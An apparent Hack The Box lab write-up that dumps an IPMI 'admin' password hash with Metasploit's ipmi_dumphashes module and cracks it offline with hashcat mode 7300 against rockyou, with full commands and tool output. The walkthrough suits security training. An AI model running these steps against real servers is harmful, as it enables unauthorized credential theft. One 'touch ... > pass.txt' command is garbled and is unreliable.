# What username is configured for accessing the host via IPMI?

We will use metasploit to get more info
`msfconsole`

We use an auxiliarity script and we set the host
`use auxiliary/scanner/ipmi/ipmi_dumphashes`
`set RHOSTS 10.129.62.0`
`show options`

Output: 
````
Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                  Current Setting                                                    Required  Description
   ----                  ---------------                                                    --------  -----------
   CRACK_COMMON          true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE   /home/htb-ac-439065/pass/pass.txt                                  no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                         no        Save captured password hashes in john the ripper format
   PASS_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS                10.129.62.0                                                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                 623                                                                yes       The target port
   SESSION_MAX_ATTEMPTS  5                                                                  yes       Maximum number of session retries, required on certain BMCs (HP iLO 4, etc)
   SESSION_RETRY_DELAY   5                                                                  yes       Delay between session retries in seconds
   THREADS               1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line


View the full module info with the info, or info -d command.
````

`run`
Output: 
````
[+] 10.129.62.0:623 - IPMI - Hash found: admin:3b3971a8820a0000c9539dec7cbdf455515ecd8bc156607a93b7ba86bff54b54352e07539fd23f97a123456789abcdefa123456789abcdef140561646d696e:bbfd3882e369ebb77d095f53a8187e5cf9ad130c
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
````

We get the user. admin and the password is hashed. 
We save the hash on a file with touch

`touch 30a000... > pass.txt`

We use hashcat to get the password

`hashcat -m 7300 /path/to/the/password/pass.txt /your/wordlist`

Output: 

````
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD EPYC 7543 32-Core Processor, skipped

OpenCL API (OpenCL 2.1 LINUX) - Platform #2 [Intel(R) Corporation]
==================================================================
* Device #2: AMD EPYC 7543 32-Core Processor, 3919/7902 MB (987 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

4336e55382060000b08c60a60630566c5bbb596b7b74463a2746265581587b7e14495b29bbec7959a123456789abcdefa123456789abcdef140561646d696e:8a0db45f5908c6c1ecc8de94f5edbb1a756c9f45:[THIS IS THE PASSWORD]
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 7300 (IPMI2 RAKP HMAC-SHA1)
Hash.Target......: 4336e55382060000b08c60a60630566c5bbb596b7b74463a274...6c9f45
Time.Started.....: Sun Dec 29 16:47:23 2024 (0 secs)
Time.Estimated...: Sun Dec 29 16:47:23 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:   829.9 kH/s (1.71ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#2....: 123456 -> lovers1

Started: Sun Dec 29 16:47:18 2024
Stopped: Sun Dec 29 16:47:24 2024
````

New spell mastered! 🧙‍♂️


